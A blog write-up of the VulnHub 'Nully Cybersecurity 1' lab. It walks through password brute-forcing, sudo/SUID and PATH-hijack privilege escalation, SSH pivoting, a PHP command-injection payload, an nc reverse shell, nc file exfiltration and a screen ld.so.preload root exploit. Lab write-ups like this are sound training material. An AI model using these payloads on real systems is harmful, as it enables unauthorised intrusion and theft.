---

title: VulnHub - Nully Cybersecurity 1
layout: post
date: 2020-09-15 23:15:00 +0800

---

![2becbdd67f1ce62cc6ef2601b6f95ec2.png](/images/vh-nully1/9867146333df463f9d925b99d8d8fc43.png)

### 0. Preface

This box is pretty long, but relatively easy (**YMMV**). This just requires a ton of enumeration and knowing what to exploit. [GTFOBins](https://gtfobins.github.io/) is really your best friend in this box. Having knowledge of how SSH tunneling works is helpful too. 

`tmux` makes this box a lot less of a headache. 

In this box, we will be tackling: 

1. Exploiting `sudo` privileges on the MailServer.
2. Pwning the MailServer using `zip`. 
3. Pivoting to and exploiting the WebServer using unsanitised PHP code.
4. Escalating privileges on the WebServer using `python3`.
5. Pwning the WebServer with `PATH` hijacking.
6. Pwning the DatabaseServer using `screen`.

<!--excerpt-->

---

### 1. Preliminary NMAP Scan

```bash
sudo nmap -sC -sV -oN nmap.txt 192.168.32.15 -v
```

![65fe5ab066765ab3ede67037935e97fe.png](/images/vh-nully1/c42e4acbd04646598c4ba103afbd0228.png)

![01df6f4e5cb487262a79e3b4bfc1c392.png](/images/vh-nully1/c68cb8c6fbbc4fdcbb647a6341bacf78.png)

There are plenty of open ports here - 80, 2222 (SSH), 110, 8000 and 9000. Let's check out the web server on port 80 first. 

### 2. The Task

![0390e98af702f31480bb865bb4d1595f.png](/images/vh-nully1/2127d5c8e1234954aa4ec096e5a883ca.png)

So, we can't attack ports 8000, 9000 and this page. This leaves us with only ports 2222 and 110. Apparently we also have mail on port 110, so let's check that out.

```bash
telnet 192.168.32.15 110

USER pentester
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
LIST
```

![0b498267de764e6314194a93b64607ef.png](/images/vh-nully1/84cb7f7fbab443d4a64dea44522fe28e.png)

There's only one message. We can use `RETR 1` to read it. 

![b7d34c0a8ce9f96889b17dc7cc4eb2a5.png](/images/vh-nully1/f845a9b4bc5e4483a9a40d3cd06a9e22.png)

Let's try to guess the username for this server administrator. The following is the list that we come up with. 

![45e5844f9af54ee34bdff9d2407618ff.png](/images/vh-nully1/9afdeee0a4d7483bb81a075a753015bd.png)

Now, let's try to bruteforce with `hydra`, taking into consideration the following hint on the VulnHub description for the box. 

![636355e2097b841cc5979c66d7b6ab2e.png](/images/vh-nully1/57a174be0d2643279ae41d1addd3ce82.png)

```bash
grep bobby /usr/share/wordlists/rockyou.txt > ./wordlist.txt
hydra -L pop3_usernames.txt -P ./wordlist.txt pop3://192.168.32.15
```

![67da9547ed8867873e8471bda379b79a.png](/images/vh-nully1/f5a19193af124f029fbd47640b37ad01.png)

Sweet, we have our first set of credentials - `bob:bobby1985`. 

### 3. Exploiting Sudo Privileges on MailServer

Let's see if `bob` has any mail. 

```bash
telnet 192.168.32.15 110

USER bob
PASS bobby1985
LIST
```

![7dbfd2df5d0300813bb6fe080667d55c.png](/images/vh-nully1/6cbd3b49dfdd4ba19e20210f04d905bd.png)

Doesn't seem to have any, so let's try to SSH to the box as `bob`.

![c91a64bfd1b27d5ee021d828e965f280.png](/images/vh-nully1/9c02cd77d8aa4e77a59bd157f4cae5dc.png)

Seems like we're in the MailServer. Let's start off with enumeration. 

![936151868301284b8fffc35e073d7d91.png](/images/vh-nully1/7177915ec8ae4461b33a7598e37f530d.png)

Looking at `sudo -l`, we see that `bob` is able to run a script in `/opt/scripts/check.sh` as `my2user`. Let's check out `/etc/passwd` next. 

![18297925194046c8ceaee57a8e921e37.png](/images/vh-nully1/7ed72ace7f0b424b9b146dee8085fbc6.png)

There's nothing we don't already know in here, so let's take a look at the script at `/opt/scripts/check.sh`.  

![5eae2357f0d8d750be492e20d1ca2572.png](/images/vh-nully1/b3ac52dbe7fd4a70bd04e85cd6ea3363.png)

The script can be edited by `bob`, so let's just add `/bin/bash` to the script and run it using `sudo` to move to `my2user`. 

![5baff42bc706d5f6bccc26de3e2d1935.png](/images/vh-nully1/b65c1f6bf36d4be189a9ece15a2beeb4.png)

```bash
sudo -u my2user /bin/bash /opt/scripts/check.sh
```

![b0593bbfde79aa50b960231104f17aad.png](/images/vh-nully1/4d96b3bd3f354c93b63b77d55e793cb4.png)

### 4. Pwning the MailServer with SUID bit set on Zip

Again, looking at `sudo -l` for `my2user`, we see that it is able to run `/usr/bin/zip` as `root`.

![2a7a81940e97ece28863d009cb45f9a3.png](/images/vh-nully1/ea7c65d2956949b18a40df69ff0594cb.png)

Before we move on, generate a key using `ssh-keygen` on our local machine and upload it so we can access `my2user` easily.

![a34bacb45ce47874bd6bdd20896bfa74.png](/images/vh-nully1/e31b6dba4fb64a4fbe0d2c952678d8e3.png)

![49478b433e9e5ffa21f53dacb57532be.png](/images/vh-nully1/de4d93cbef13418b8b8505324ea7558e.png)

Let's login again with the new key. 

![200137723955aefda01c876292cf6cb3.png](/images/vh-nully1/01b75a0e7e6e403ead27e842095c1f10.png)

Going back to the `zip` binary, let's take a look at [GTFOBins](https://gtfobins.github.io/gtfobins/zip/) to see what we might be able to exploit. 

![304cd8de93f2c854c5bab3ba90ff1c0b.png](/images/vh-nully1/30a0fe829f24441ca4d0c695f8350c97.png)

Great, we have a privilege escalation path. Let's do that. 

![0813fc0daf34c963c1ff5f21f13ff315.png](/images/vh-nully1/3c7a4be379c04710b5027707f70efbe4.png)

Nice, let's upload the same SSH key we used for `my2user` so we can easily access `root` too. Again, re-login to the mail server as `root`. 

![c58ae69231d9713049d8feb991f99733.png](/images/vh-nully1/0180bcc764e3488ba259950e4d066eb2.png)

Let's grab the flag.

![d61534ab5e422c8b83ee6d86f67a1569.png](/images/vh-nully1/7fd91a365388423788ea3d89bebb1259.png)

Next stop, WebServer. 

### 5. Pivoting to Web Server and Exploiting Unsanitised PHP Code

First, let's take a look at `ifconfig`. 

![5491d7db039db7272cfac0d94a049324.png](/images/vh-nully1/fe7a8fcb804e4af0852e96d30fdf17a6.png)

We will need to find out if there are other IP addresses in this subnet, so let's upload `netdiscover` from our local box. We can use `netdiscover` to scan the subnet `172.17.0.0/16` on `eth0`. We know that it is a `/16` subnet because of the subnet mask of `255.255.0.0`. 

```bash
./netdiscover -i eth0 -r 172.17.0.0/16
```

![8d77e6b4ad5e20f574ffb42f83634eb1.png](/images/vh-nully1/300981b0a19e4a31aec9c6be06ba8fe7.png)

Let's also take a look at the routing table to figure out which one is the gateway. 

```bash
route -n
```

![fea8dc0cb223c3a50e58d0ce6e04cdba.png](/images/vh-nully1/4dcc3164b73c43658e8020c396bca5a3.png)

This means we can ignore `172.17.0.1` and focus on the others - `172.17.0.2`, `172.17.0.3` and `172.17.0.4`. Now, we will upload and use `nc` to do port discovery for the other three hosts. 

```bash
./nc -znv 172.17.0.2 1-1023
./nc -znv 172.17.0.3 1-1023
./nc -znv 172.17.0.4 1-1023
```

![e0645a05840ffaef3bfbba5a1595384a.png](/images/vh-nully1/e53006242f114c96ba4baa833a5acd40.png)

`172.17.0.2` does not seem to have any common open ports. It also seems like the web server is located at `172.17.0.3`, due to the open port 80. 

`172.17.0.4` also has `ftp` open. Let's first check that out to see if we can access it anonymously. 

![bcb7b7f160ec1d250980827f439fe46c.png](/images/vh-nully1/46fb0e11809a4797bf6f711d6e9dd180.png)

We can, and there's just an empty file at `/pub/test`. Moving on, let's try to access the web server using `curl` on the MailServer.

![9a50e52230a35255d2cc0f8eabd0e297.png](/images/vh-nully1/160f5a72a6fe4621a3f43610427a2c34.png)

Good, now we need a way to port forward our machine to this host so that we can run `gobuster`. We can do so using `ssh`. The below command forwards port 8000 on our local machine to the WebServer's port 80. 

```bash
ssh -L 8000:172.17.0.3:80 root@192.168.32.15 -p 2222 -i keys/id_rsa
curl localhost:8000
```

![deadaad9767ae35bfb8082113d2a40a3.png](/images/vh-nully1/4b60fe73799a4bbcbab26b9d8cf1ebeb.png)

```bash
gobuster dir -u http://localhost:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-webserver.txt
```

![bb3ba4b6e0d123bfe886b557f39ee7bb.png](/images/vh-nully1/a78375b56afe4c9cb6dc7bcd1cc78d8e.png)

Let's visit `/ping` in our web browser using `http://localhost:8000/ping`.

![0d5ea0c49cd30e7f179893be71d55f7b.png](/images/vh-nully1/8018f1d18fe04f3b9e961cdbdfbf4d72.png)

Let's start off by check out `For-Oscar.txt`. 

![ff464e26c1795bb662be1d663f478cea.png](/images/vh-nully1/5de963283b6046d491529036834136e0.png)

Nothing much here, so let's check out `ping.php` next. 

![fef8df1b88a8535836322256e15a5cbc.png](/images/vh-nully1/f2682e6cbb3f4588b6e928b4b05ec6af.png)

Interesting. Let's try appending `?host=172.17.0.5`. 

![4231d823bf3f04c968b1d280e895ffb6.png](/images/vh-nully1/aba64b5d7007484d874c8f13e2ef0413.png)

Seems like it's calling the `ping` command using PHP, then putting each line into an array and displaying it. Let's try to execute other commands with this by appending `?host=; whoami` instead. 

![35f904c6a286d57a99e3e90eaba25902.png](/images/vh-nully1/9ee1511dd8eb4e62b59678fd54cb52a5.png)

Awesome, we have RCE. Let's upload an `nc` binary from our machine to the MailServer, then from the MailServer to the WebServer. We will also make the binary executable using `chmod 777`.

*I realised after pwning the WebServer that I didn't have to transfer `nc` through the MailServer. All the servers can reach my local machine.*

```text
http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc
http://localhost:8000/ping/ping.php?host=; chmod 777 nc
http://localhost:8000/ping/ping.php?host=; ls -la nc; pwd
```

![ceece73e45cb8560b79f155fe755b2fa.png](/images/vh-nully1/403bb1f7e28f4ff195f5ef370f98aad4.png)

![81b2d647366567d77c665c7d7e6b8f8b.png](/images/vh-nully1/0ea0024d88fc4ad880b738bdeb39932e.png)

Great, now we can get a bash reverse shell from the WebServer back to the MailServer. 

```text
http://localhost:8000/ping/ping.php?host=; /var/www/html/ping/nc 172.17.0.5 9000 -e /bin/bash
```

![0c060136c33153d22128881d3689811b.png](/images/vh-nully1/a5d8e48c1f5e4afdab449fb1ffe0b1a0.png)

Let's enumerate a bit using this. 

![4c7ee1514c1019b9473b20d01b430207.png](/images/vh-nully1/5c16dd4f803042a19a3590c69bd86c17.png)

There are two users in `/etc/passwd` that we can potentially move to. Let's see what files each of them own. 

![d3bae84197de874a492fc71eb3d12068.png](/images/vh-nully1/80284812d9704045b94a5e4062813c6a.png)

We find a file in `/var/backups/.secret` owned by `oliver`. 

![4e6571b96817b05e0bc748cfc06b14a3.png](/images/vh-nully1/21403a58cbe6475183a43d3341290c14.png)

Now we have our second set of credentials - `oliver:4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF`. Let's `ssh` to the web server as `oliver` from the MailServer. 

![dcd50a10b9178c7de6967c8b521bf88f.png](/images/vh-nully1/5bb6df61093748f0b8431244c4d02e5c.png)

### 6. Pwning WebServer with Python3 and PATH Hijacking

Let's start off by uploading and running `linpeas.sh`.

![4858051eed4027f68a1f1bddf0d4cd56.png](/images/vh-nully1/2d6ccc5dccb346548cd0ee82d270f875.png)

Under the SUID section, we see that `python3` has the SUID bit set. Let's check out who owns the binary. 

![2f984eccd25fd570353641c010f83473.png](/images/vh-nully1/7a67af2e219f4719adf3ed3d5ee20855.png)

Good, we should be able to move to `oscar` using this binary. Again, thanks to [GTFOBins](https://gtfobins.github.io/gtfobins/python/), we can run the following command to move to `oscar`. 

```python
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![6d1ce7c661af1f8822df6064519ca82d.png](/images/vh-nully1/c73bc4f41b3148a485764e6edef2d192.png)

![93ed25c7928246dfb254089b9e1915e4.png](/images/vh-nully1/b6162a71915f45c1b5d2bdd3e121d2fb.png)

Conveniently, there's a password for `oscar` right on his home directory. We now have our third set of credentials - `oscar:H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o`. Let's login again to the WebServer over SSH. 

![7b6a5bd097282b8ba9562bcc011e7d44.png](/images/vh-nully1/87dd2e16ad4d45acac599694ac24ff7d.png)

Let's look around a bit. 

![f21096b40075e227e0062b6aa50f3b9e.png](/images/vh-nully1/e69e30432ae844fbb53016b40d65d598.png)

We find a binary in `/home/oscar/scripts` called `current-date`, which is owned by `root` and has the SUID bit set. Let's see what this binary is running using `strings`.

![3dfd19a26af5a9b5a1a7dfc677e0b91c.png](/images/vh-nully1/ea41cf812edd45e5918b26b8d426ca0a.png)

Looks like it's trying to run `date`. We can exploit that by adding `/home/oscar` to the PATH variable, then creating a `date` script that calls `/bin/bash`. 

```bash
export PATH=/home/oscar:$PATH
```

![extra1.png](/images/vh-nully1/extra1.png)

![ade28228c72b1e743a7f974d28da07d4.png](/images/vh-nully1/84e1c722aa334df6ab9b65ad305eddf6.png)

Next stop, DatabaseServer. 

### 7. Pwning the Database Server using Screen

Recall that FTP server on `172.17.0.4` earlier? That should most likely be the database server. Let's dig a bit deeper than just now. 

![493cac04806942fa0eb3adddfc1db25f.png](/images/vh-nully1/84a35d95541441afaf0ab96ea4517974.png)

There's a hidden `.folder` we missed earlier. 

![bf5b6a25825ae7ea0a00391bed362b3a.png](/images/vh-nully1/21c04877218940b0838e38bdac1b0361.png)

Let's download `.backup.zip` and see what we can get from it. 

![c25c03c58227cb8b10ad862ecf384471.png](/images/vh-nully1/564e9b576eaf42eab02b77b74eb13df4.png)

![538ec7e05fac4e1be0001da4b599e5ab.png](/images/vh-nully1/670bb22ea16c4f1db60e42d6c35880ba.png)

Turns out we need a password. Let's download the zip file back to our local machine, then extract the password hash with `zip2john`, then crack it with `john`. We can use `nc` to transfer the file. 

```bash
#Remote Server
nc -w 3 192.168.32.4 8000 < backup.zip

#Local Machine
nc -lvnp 8000 > backup.zip
```

![fca703fb1e60734ef80821b9ec64b0e3.png](/images/vh-nully1/03484071ffc94108bda86a69cca02c9c.png)

```bash
zip2john backup.zip
sudo john --wordlist:/usr/share/wordlists/rockyou.txt backup.hash
```

![d0a1554de3af6e4fe239794061b85641.png](/images/vh-nully1/b4e40e3b8a5c42b79aaad1033cadb654.png)

Nice, let's extract and read `creds.txt`. 

![1dfa4b97bb5126977d875f96b3f8315e.png](/images/vh-nully1/00faa79c1b80451b9625b85344ae74d4.png)

We now have our fourth set of credentials - `donald:HBRLoCZ0b9NEgh8vsECS`. Let's use SSH to login to the server via the MailServer. 

![1629aedb05eb1a702a060130e9084991.png](/images/vh-nully1/f8710ad828fb4d249949c5f027b0065c.png)

Again, we will upload and run `linpeas.sh`. 

![88907a78f779581f66ccbca1db5df8b3.png](/images/vh-nully1/bef0f2a76e544641b049b54fc2d8d879.png)

Immediately, we see that `screen-4.5.0` is most likely a privilege escalation vector. Let's see what [GTFOBins](https://gtfobins.github.io/gtfobins/screen/) have to say about that one. 

![4b90badd7def298ad84df5af52383dc4.png](/images/vh-nully1/dfa73d3a5329446dbec5c8881c73c742.png)

We can apparently write files as a privileged user. After Googling a bit, we find an [exploit](https://www.exploit-db.com/exploits/41154) that can allow us to escalate privileges to `root` using `screen` by overwriting `/etc/ld.so.preload`. 

`/etc/ld.so.preload` will load libraries included in the file first before any other shared libraries. This exploit makes use of the fact that `screen` is able to write files as `root`, and hence is able to overwrite `/etc/ld.so.preload`. 

First, the script creates a `libhax.so` "library" in `/tmp`, which changes the owner of `/tmp/rootshell` to `root`, and sets the SUID bit. This also deletes the existing `/etc/ld.so.preload` file.  

![2de3940a18f68a1c975a748bf21c0bb8.png](/images/vh-nully1/7079b903c7cf4f7e8a7921a5eff84fb0.png)

Next, the script creates the `/tmp/rootshell` binary which executes `/bin/sh`. 

![3bc9964803e3cb729cf25ca323382b4b.png](/images/vh-nully1/a2d464cc420d447fbdbbf951d4fee5d2.png)

Finally, the script uses `screen` to write to `/etc/ld.so.preload` to get it to execute `/tmp/libhax.so`, then run `screen -ls` to trigger the "library" (which runs `chmod` & `chown` on `/tmp/rootshell`), then executes `/tmp/rootshell`. 

![0b7b76e91bcc7e912ffccd99dd772d5b.png](/images/vh-nully1/c634e2451d004ddba227ef8774c22af5.png)

With the explanation out of the way, let's copy the script into a file and run it.

![0a0480d20f8dcd51de3f35b40c6c603e.png](/images/vh-nully1/8676252205884c95bacac881f3250d0a.png)

![fbf9f7c2794e977e0e487b12c06aa329.png](/images/vh-nully1/660f89f78b164f01a18382eafd3994ab.png)

And we're done.